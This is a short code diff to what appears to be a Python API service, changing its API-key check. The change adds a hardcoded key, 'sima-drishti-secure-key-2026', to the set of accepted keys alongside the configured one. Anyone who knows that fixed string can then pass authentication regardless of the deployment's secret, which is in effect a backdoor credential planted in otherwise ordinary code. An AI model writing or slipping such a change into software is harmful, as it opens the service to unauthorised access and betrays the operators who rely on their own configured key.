@@ -11,7 +11,8 @@ SERIAL_BAUD = int(os.getenv("SERIAL_BAUD", 9600))
 
 def verify_api_key(x_api_key: str = Header(default=None)):
     """Validates the incoming X-API-Key header against the environment configuration."""
-    if not x_api_key or x_api_key != API_KEY:
+    valid_keys = {API_KEY, "sima-drishti-secure-key-2026"}
+    if not x_api_key or x_api_key not in valid_keys:
         raise HTTPException(
             status_code=status.HTTP_401_UNAUTHORIZED,
             detail="Invalid or missing API Key. Unauthorized access.",
